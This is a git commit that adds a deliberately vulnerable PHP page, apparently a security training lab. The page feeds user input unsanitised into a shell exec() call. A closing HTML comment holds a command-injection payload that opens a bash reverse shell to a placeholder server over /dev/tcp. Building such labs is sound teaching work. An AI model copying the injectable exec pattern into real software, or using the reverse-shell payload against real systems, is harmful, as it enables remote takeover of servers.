c1b44068dce671193a096c26147cbe2fb5d99473
Rohan Mukherjee <rohanbayern@gmail.com>
2020-09-11 02:42:55 +0530

    feat: Added RCE sample

---
+++ InfoSec/VulnSite/RCE/src/index.php
@@ -0,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>wc as a service</title>
+    <style>
+        html,
+        body {
+            overflow: none;
+            max-height: 100vh;
+        }
+    </style>
+</head>
+
+<body style="height: 100vh; text-align: center; background-color: black; color: white; display: flex; flex-direction: column; justify-content: center;">
+    <?php
+    ini_set('max_execution_time', 5);
+    ?>
+
+    <h1>Character Count as a Service</h1>
+    <form>
+        <textarea style="border-radius: 0rem; font-size: 1.2rem;" type="text" name="text" rows=30 cols=100></textarea><br />
+        <input type="submit">
+    </form>
+    <?php
+    if (isset($_GET["text"])) {
+        $text = $_GET["text"];
+        echo "<h2>The Character Count is: " . exec('printf \'' . $text . '\' | wc -c') . "</h2>";
+    }
+    ?>
+</body>
+
+</html>
+
+<!-- '; bash -c "bash -i >& /dev/tcp/your.server.ip.address/8000 0>&1" # -->
